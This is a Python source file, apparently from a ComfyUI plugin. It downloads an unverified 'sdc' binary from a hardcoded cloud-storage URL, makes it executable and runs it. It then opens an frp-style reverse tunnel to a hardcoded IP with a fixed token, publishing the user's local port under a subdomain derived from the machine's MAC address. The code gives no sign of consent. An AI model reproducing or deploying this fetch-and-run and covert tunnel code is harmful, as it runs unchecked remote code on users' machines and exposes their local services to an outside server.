#!/user/bin/env python3
# -*- coding: utf-8 -*-
import aiohttp
import requests
from aiohttp import web
import subprocess
import os
import time
import threading
from collections import deque
import uuid
import sys
import re
import hashlib
import platform
import stat
import urllib.request
from urllib.parse import parse_qs, urlparse

def get_mac_address():
    mac = uuid.getnode()
    result = ':'.join(('%012X' % mac)[i:i + 2] for i in range(0, 12, 2))
    return result

def get_port_from_cmdline():
    for i, arg in enumerate(sys.argv):
        if arg == '--port' and i + 1 < len(sys.argv):
            try:
                result = int(sys.argv[i + 1])
                return result
            except ValueError:
                pass
        match = re.search(r'--port[=\s]*(\d+)', arg)
        if match:
            try:
                result = int(match.group(1))
                return result
            except ValueError:
                pass
    return 8188


def generate_unique_subdomain(mac_address, port):
    unique_key = f"{mac_address}:{port}"
    hash_object = hashlib.sha256(unique_key.encode())
    subdomain = hash_object.hexdigest()[:12]
    return subdomain


def set_executable_permission(file_path):
    try:
        st = os.stat(file_path)
        os.chmod(file_path, st.st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
        print(f"Execution permissions set on {file_path}")
    except Exception as e:
        print(f"Failed to set execution permissions: {e}")


def download_file(url, dest_path):
    try:
        with urllib.request.urlopen(url) as response, open(dest_path, 'wb') as out_file:
            data = response.read()
            out_file.write(data)
        print(f"File downloaded successfully: {dest_path}")
    except Exception as e:
        print(f"Failed to download the file: {e}")


PLUGIN_DIR = os.path.dirname(os.path.abspath(__file__))
SD_CLIENT_DIR = os.path.join(PLUGIN_DIR, "sdc")
SDC_EXECUTABLE = os.path.join(SD_CLIENT_DIR, "sdc" if platform.system() != "Windows" else "sdc.exe")
INI_FILE = os.path.join(SD_CLIENT_DIR, "sdc.toml")
LOG_FILE = os.path.join(SD_CLIENT_DIR, "sdc.log")
print(
    f"zhangtao batch variable: \n\t\t\t\tPLUGIN_DIR: {PLUGIN_DIR}\n\t\t\t\tSD_CLIENT_DIR: {SD_CLIENT_DIR}\n\t\t\t\tSDC_EXECUTABLE:{SDC_EXECUTABLE}\n\t\t\t\tINI_FILE: {INI_FILE}\n\t\t\t\tLOG_FILE:{LOG_FILE}")

class SDClient:
    RED = "\033[91m"
    RESET = "\033[0m"

    def __init__(self, local_port, subdomain):
        print(f"zhangtao SDClient init start input: local_port: {local_port} | subdomain: {subdomain}")
        self.local_port = local_port
        self.server_addr = "146.56.241.80" #"suidao.9syun.com"
        self.server_port = "30001" #"30001"
        self.token = "wanto" #"wanto"
        self.subdomain = subdomain
        self.sd_process = None
        self.connected = False
        self.monitoring_thread = None
        self.stop_monitoring = False

    def create_sdc_ini(self, file_path, subdomain):
        config_content = f"""
serverAddr = "{self.server_addr}"
serverPort = {self.server_port}
auth.token = "{self.token}"

[[proxies]]
name = "{subdomain}"
type = "http"
localPort = {self.local_port}
subdomain = "{subdomain}"
"""
        with open(file_path, "w") as config_file:
            config_file.write(config_content)

    def tail_log(self, filename, num_lines=20):
        try:
            with open(filename, "r") as file:
                return deque(file, num_lines)
        except FileNotFoundError:
            return deque()

    def check_sd_log_for_status(self):
        success_keywords = ["login to server success", "start proxy success"]
        failure_keywords = ["connect to server error", "read tcp", "session shutdown"]
        connection_attempt_pattern = re.compile(r"try to connect to server")
        latest_lines = self.tail_log(LOG_FILE, 20)
        connection_attempt_index = None
        for index, line in enumerate(latest_lines):
            if connection_attempt_pattern.search(line):
                connection_attempt_index = index
        if connection_attempt_index is not None and connection_attempt_index + 1 < len(latest_lines):
            next_line = latest_lines[connection_attempt_index + 1]
            for keyword in success_keywords:
                if keyword in next_line:
                    return "connected"
            return "disconnected"
        return "disconnected"

    def check_and_download_executable(self):
        if platform.system() != "Windows":
            if not os.path.exists(SDC_EXECUTABLE):
                print("SDC executable not found, downloading...")
                download_file("https://tt-1254127940.file.myqcloud.com/tech_huise/66/qita/sdc", SDC_EXECUTABLE)
                set_executable_permission(SDC_EXECUTABLE)

    def start(self):
        print(f"zhangtao SDClient start() start")
        self.check_and_download_executable()
        self.create_sdc_ini(INI_FILE, self.subdomain)
        open(LOG_FILE, "w").close()
        env1 = os.environ.copy()
        env1['http_proxy'] = ''
        env1['https_proxy'] = ''
        env1['no_proxy'] = '*'
        try:
            with open(LOG_FILE, "a") as log_file:
                self.sd_process = subprocess.Popen([SDC_EXECUTABLE, "-c", INI_FILE], stdout=log_file, stderr=log_file,
                                                   env=env1)
            print(f"zhangtao SD client started with PID: {self.sd_process.pid}")
            self.stop_monitoring = False
            self.monitoring_thread = threading.Thread(target=self.monitor_connection_status)
            self.monitoring_thread.start()
            print(f"zhangtao SDClient start() end")
        except FileNotFoundError:
            print(f"Error: '{SDC_EXECUTABLE}' not found。")
        except Exception as e:
            print(f"Error starting SD client: {e}")

    def monitor_connection_status(self):
        print(f"zhangtao SDClient monitor_connection_status() start")
        while not self.stop_monitoring:
            status = self.check_sd_log_for_status()
            print(f"monitor connected status: {status}")
            if status == "connected":
                if not self.connected:
                    print(f"SD client successfully connected with PID: {self.sd_process.pid}")
                    self.connected = True
            else:
                if self.connected:
                    print(f"{self.RED}Waiting for SD client to connect...{self.RESET}")
                    self.connected = False
            time.sleep(1)
        print(f"zhangtao SDClient monitor_connection_status() end")

    def stop(self):
        if self.sd_process and self.sd_process.poll() is None:
            self.sd_process.terminate()
            self.sd_process.wait()
            print("SD client stopped。")
        else:
            print("SD client is not running。")
        self.connected = False
        self.stop_monitoring = True
        print(f"zhangtao SDClient stop() end")

    def is_connected(self):
        print(f"zhangtao SDClient is_connected() end")
        return self.connected

    def clear_log(self):
        if os.path.exists(LOG_FILE):
            open(LOG_FILE, "w").close()
            print("SD client log cleared。")
        print(f"zhangtao SDClient clear_log() end")

def start_frpc():
    if platform.system() != "Darwin":
        print(f"zhangtao platform start: platform : {platform.system()}")
        local_port = get_port_from_cmdline()
        subdomain = generate_unique_subdomain(get_mac_address(), local_port)
        sd_client = SDClient(local_port=local_port, subdomain=subdomain)
        sd_client.start()
        while not sd_client.is_connected():
            time.sleep(1)
        return sd_client






